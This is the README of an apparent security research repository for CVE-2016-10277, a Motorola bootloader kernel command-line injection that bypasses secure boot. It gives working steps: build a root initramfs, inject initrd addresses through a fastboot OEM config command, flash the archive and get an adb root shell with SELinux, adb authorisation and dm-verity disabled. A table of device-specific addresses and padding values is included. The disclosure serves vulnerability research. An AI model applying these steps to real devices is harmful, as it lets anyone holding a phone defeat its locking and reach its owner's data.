# initroot: Motorola Bootloader Kernel Cmdline Injection Secure Boot & Device Locking Bypass (CVE-2016-10277) #

By Roee Hay / Aleph Research, HCL Technologies

## Instructions ##

1. Use the commited `initroot-<device>.cpio.gz`, or produce your own:
```
$ cd <initramfs folder>
$ find . | grep -v [.]$ | cpio -R root:root -o -H newc | gzip > ../initroot-<device>.cpio.gz
OR if padding is needed:
$ cp ../pad ../initroot-<device>.cpio.gz && find . | grep -v [.]$ | cpio -R root:root -o -H newc | gzip > ../tmp && ls -la ../tmp && cat ../tmp >> ../initroot-<device>.cpio.gz  && rm -fr ../tmp
$ cd ..
```
2. Our commited initramfs images have adb running as root by default. It will not ask for authorization. In addition, dm-verity is disabled on the relevant partitions
```terminal
fastboot oem config fsg-id "a initrd=<SCRATCH_ADDR+PADDING>,<initroot.cpio.gz size-PADDING>"`
fastboot flash foo initroot-<device>.cpio.gz`
fastboot continue
```
3. if you use our initramfs, `adb shell` will now give you a root shell:
```
$ adb shell
shamu:/ # id
uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:su:s0
```

## Verified Devices ##
| Device           | `SCRATCH_ADDR` | `PADDING`   | committed `initrams`
|------------------|--------------|-----------|---------
| shamu (Nexus 6)  | `0x11000000`   | `0x0`         | AOSP `userdebug`
| cedric (Moto G5) | `0xA0100000`   | `0x2000000` | Release, patched `init` and `adbd` to disable SELinux, `set{u,g}id` to shell, capabilities drop and adb auth, etc
| athene (Moto G4) | `0x90000000`   | `0x2000000` | ""


## Community Reported ##
| Device           | Reporter | Description
|------------------|--------------|-----------
| Moto G5 Plus  | [drbeat](https://github.com/drbeat)  | Injected boot property. [[proof](https://github.com/alephsecurity/initroot/issues/1)]
| Moto G4 Play  | [@autoprime](https://twitter.com/autoprime)   | Full Exploitation of Verizon XT1609. [[proof](https://twitter.com/utoprime/status/873941023050919936)]
| Moto G3 | [@asiekierka](https://twitter.com/asiekierka) | Injected initrd caused boot loops. [[proof](https://twitter.com/asiekierka/status/873467107090075648)]


## Note ##
This vulnerability may affect other Motorola devices too: a different initramfs will be needed. A different physical address of initrd (`SCRATCH_ADDR`). `PADDING` may vary as well.

## Publications ##
1. [initroot: Bypassing Nexus 6 Secure Boot through Kernel Command-line Injection](https://alephsecurity.com/2017/05/23/nexus6-initroot/)
2. [initroot: Hello Moto](https://alephsecurity.com/2017/06/07/initroot-moto/)
3. [Motorola Android Bootloader Kernel Cmdline Injection Secure Boot Bypass](https://alephsecurity.com/vulns/aleph-2017011)



